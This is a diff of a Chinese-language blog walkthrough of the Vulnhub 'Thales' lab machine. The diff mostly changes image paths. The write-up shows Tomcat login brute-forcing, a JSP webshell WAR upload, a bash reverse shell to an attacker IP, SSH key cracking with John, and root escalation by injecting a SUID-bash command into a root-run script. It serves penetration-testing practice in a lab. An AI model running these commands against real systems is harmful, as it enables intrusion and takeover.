@@ -136,29 +136,29 @@ article: http://ogp.me/ns/article#">
       
       
         <span class="post-updated">
-          最后更新于 <time datetime="2026-01-28T09:23:18.344Z">2026-01-28</time>
+          最后更新于 <time datetime="2026-04-01T09:27:58.366Z">2026-04-01</time>
         </span>
       
       <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
     </div>
     <div class="post-content">
-      <p>这个靶机还是要改网卡设置，见<a href="Vulnhub/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"></a></p>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><code>nmap 192.168.59.0/24</code><br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128153911.png"></p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><code>nmap -sV -p- 192.168.59.147</code><br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128154008.png"></p>
+      <p>这个靶机还是要改网卡设置，见<a href="/imagesVulnhub/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"></a></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><code>nmap 192.168.59.0/24</code><br><img src="/images/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128153911.png"></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><code>nmap -sV -p- 192.168.59.147</code><br><img src="/images/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128154008.png"></p>
 <h1 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h1><p>访问8080端口，发现这个网站需要登录，这个网站是Apache Tomcat&#x2F;9.0.52，试试用msfconsole爆破一下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search tomcat login</span><br><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line">set rhost 192.168.59.147</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 <p><strong>search tomcat login​​</strong></p>
 <ul>
 <li>​​作用​​：在 Metasploit 的漏洞数据库中搜索与 ​​Tomcat 管理登录页面​​ 相关的漏洞利用模块（exploits）或辅助模块（auxiliary）。</li>
 <li><code>auxiliary/scanner/http/tomcat_mgr_login​​</code>：用于扫描 Tomcat 管理登录页面是否存在弱口令（默认账号 <code>tomcat:tomcat</code> 或 <code>admin:admin</code>）。<br>-<strong><code>set RHOSTS 192.168.109.159</code>​</strong>​  </li>
-<li>设置目标主机的 IP 地址为 <code>192.168.109.159</code>（即你要扫描的 Tomcat 服务器地址）。<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128155000.png"><br>得到了账号密码<br><code>tomcat:role1</code><br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128155410.png"><br>这里有文件上传功能是要部署的waf文件<br><strong>war文件是Java Web应用程序的一种打包格式，全称为Web Application Archive（Web应用归档文件）。</strong><br><strong>它本质上是一个压缩包（类似ZIP格式），包含了Web应用运行所需的所有资源，比如：</strong></li>
+<li>设置目标主机的 IP 地址为 <code>192.168.109.159</code>（即你要扫描的 Tomcat 服务器地址）。<br><img src="/images/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128155000.png"><br>得到了账号密码<br><code>tomcat:role1</code><br><img src="/images/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128155410.png"><br>这里有文件上传功能是要部署的waf文件<br><strong>war文件是Java Web应用程序的一种打包格式，全称为Web Application Archive（Web应用归档文件）。</strong><br><strong>它本质上是一个压缩包（类似ZIP格式），包含了Web应用运行所需的所有资源，比如：</strong></li>
 <li><strong>Java类文件（.class）</strong></li>
 <li><strong>JSP页面</strong></li>
 <li><strong>HTML、CSS、JavaScript等静态资源</strong></li>
 <li><strong>配置文件（如web.xml）</strong></li>
-<li><strong>依赖的库文件（.jar）等</strong><br><strong>主要用途：</strong><br><strong>war文件便于Web应用的部署和传播。当把war文件放到Tomcat等Java Web服务器的指定目录（如webapps）时，服务器会自动解压并部署该应用，无需手动处理内部文件结构。</strong><br>所以我可以上传jsp木马文件压缩包<br>先写一个让哥斯拉生成一个木马文件<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128162538.png"><br>压缩为ZIP，再把后缀改成war上传<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128162618.png"><br>&#x2F;123&#x2F;123.jsp能成功访问到就可以连接了<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128162524.png"><br>执行命令：<code>/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.59.128/7777 0&gt;&amp;1&#39;</code>就可以拿到shell了<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128162920.png"><br>找到两个txt文件，查看user.txt文件，需要thales权限，查看notes.txt文件，notes.txt 中告诉我们有一个备用脚本在 <code>/usr/local/bin/backup.sh</code><br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128163744.png"><br><code>ls -la</code>可以看到有个<code>.ssh</code>文件<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128164532.png"><br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128164630.png"><br>里面还有公钥和私钥<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128164736.png"><br>我们把它保存下来，用john进行爆破<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128165547.png"><br>我这里先将私钥保存到1.txt<br>然后使用命令<code>ssh2john 1.txt &gt; 2.txt</code><strong>将 SSH 私钥转换为 John the Ripper（简称 John）能够识别和破解的“哈希（Hash）”格式</strong><br>最后使用<code>john --wordlist=/usr/share/wordlists/rockyou.txt /root/2.txt</code>破解密码<br>（注：第一次使用需要解压rockyou.txt，命令如下<code>gunzip /usr/share/wordlists/rockyou.txt.gz</code>）<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128170125.png"><br><strong>升级 Shell 获取 TTY</strong><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><strong>登录到用户thales</strong><code>su thales</code>，输入密码即可<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128170345.png"><br>拿到第一个flag</li>
+<li><strong>依赖的库文件（.jar）等</strong><br><strong>主要用途：</strong><br><strong>war文件便于Web应用的部署和传播。当把war文件放到Tomcat等Java Web服务器的指定目录（如webapps）时，服务器会自动解压并部署该应用，无需手动处理内部文件结构。</strong><br>所以我可以上传jsp木马文件压缩包<br>先写一个让哥斯拉生成一个木马文件<br><img src="/images/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128162538.png"><br>压缩为ZIP，再把后缀改成war上传<br><img src="/images/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128162618.png"><br>&#x2F;123&#x2F;123.jsp能成功访问到就可以连接了<br><img src="/images/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128162524.png"><br>执行命令：<code>/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.59.128/7777 0&gt;&amp;1&#39;</code>就可以拿到shell了<br><img src="/images/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128162920.png"><br>找到两个txt文件，查看user.txt文件，需要thales权限，查看notes.txt文件，notes.txt 中告诉我们有一个备用脚本在 <code>/usr/local/bin/backup.sh</code><br><img src="/images/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128163744.png"><br><code>ls -la</code>可以看到有个<code>.ssh</code>文件<br><img src="/images/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128164532.png"><br><img src="/images/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128164630.png"><br>里面还有公钥和私钥<br><img src="/images/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128164736.png"><br>我们把它保存下来，用john进行爆破<br><img src="/images/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128165547.png"><br>我这里先将私钥保存到1.txt<br>然后使用命令<code>ssh2john 1.txt &gt; 2.txt</code><strong>将 SSH 私钥转换为 John the Ripper（简称 John）能够识别和破解的“哈希（Hash）”格式</strong><br>最后使用<code>john --wordlist=/usr/share/wordlists/rockyou.txt /root/2.txt</code>破解密码<br>（注：第一次使用需要解压rockyou.txt，命令如下<code>gunzip /usr/share/wordlists/rockyou.txt.gz</code>）<br><img src="/images/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128170125.png"><br><strong>升级 Shell 获取 TTY</strong><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><strong>登录到用户thales</strong><code>su thales</code>，输入密码即可<br><img src="/images/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128170345.png"><br>拿到第一个flag</li>
 </ul>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>使用命令<code>ls -l /usr/local/bin/backup.sh</code>判断我们是否可写<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128164155.png"><br>是一个shell文件，并且是能运行命令的，我们是可以编辑的，并且是root用户运行的，我们插入一串反弹shell的命令</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>使用命令<code>ls -l /usr/local/bin/backup.sh</code>判断我们是否可写<br><img src="/images/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128164155.png"><br>是一个shell文件，并且是能运行命令的，我们是可以编辑的，并且是root用户运行的，我们插入一串反弹shell的命令</p>
 <h3 id="步骤-1：向脚本中注入恶意命令"><a href="#步骤-1：向脚本中注入恶意命令" class="headerlink" title="步骤 1：向脚本中注入恶意命令"></a>步骤 1：向脚本中注入恶意命令</h3><p>我们要往这个脚本的末尾添加一行代码。这行代码的作用是给 <code>/bin/bash</code> 设置 SUID 权限并复制到 <code>/tmp</code> 目录下，这样运行它时就拥有 root 权限了。</p>
 <p>执行以下命令：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash&quot;</span> &gt;&gt; /usr/local/bin/backup.sh</span><br></pre></td></tr></table></figure>
@@ -171,7 +171,7 @@ article: http://ogp.me/ns/article#">
 
 <h3 id="步骤-4：获取-Root-Shell"><a href="#步骤-4：获取-Root-Shell" class="headerlink" title="步骤 4：获取 Root Shell"></a>步骤 4：获取 Root Shell</h3><p>一旦看到 <code>/tmp/rootbash</code> 出现，并且权限位有 <code>s</code>（例如 <code>-rwsr-xr-x</code>），立即执行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/rootbash -p</span><br></pre></td></tr></table></figure>
-<p><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128171636.png"><br>成功拿到root权限</p>
+<p><img src="/images/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128171636.png"><br>成功拿到root权限</p>
 
     </div>
   </article>
@@ -311,14 +311,14 @@ article: http://ogp.me/ns/article#">
                 <div class="category-item">
                     <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" aria-label="分类: 内网渗透">
                         内网渗透
-                        <span>(17)</span>
+                        <span>(16)</span>
                     </a>
                 </div>
             
                 <div class="category-item">
                     <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E6%97%A5%E8%AE%B0/" aria-label="分类: 靶机日记">
                         靶机日记
-                        <span>(17)</span>
+                        <span>(16)</span>
                     </a>
                 </div>
             
